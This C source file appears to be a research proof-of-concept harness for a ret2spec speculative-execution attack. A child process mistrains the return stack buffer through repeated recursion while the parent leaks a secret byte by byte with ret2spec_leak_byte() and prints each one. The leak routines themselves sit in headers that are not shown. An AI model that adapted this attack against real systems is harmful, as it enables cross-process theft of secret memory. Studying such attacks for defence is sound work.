#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "trex.h"
#include "demo.h"
#include "ret2spec.h"
#include "utils.h"

static void yield(void)
{
	sched_yield();
}

int main(void)
{
	trex_demo_init(true, true);

	return_true_base_case = yield;
	return_false_base_case = yield;

	if (is_child) {
		while (true) {
			returns_false(RECURSION_DEPTH);
			if (getppid() != parent_pid) {
				trex_demo_exit(TREX_SUCCESS);
			}
		}
	} else {
		for (size_t i = 0; i < SECRET_LEN; i++) {
			current_offset = i;
			print_leak(ret2spec_leak_byte(), i);
		}
	}

	trex_demo_exit(TREX_SUCCESS);
}
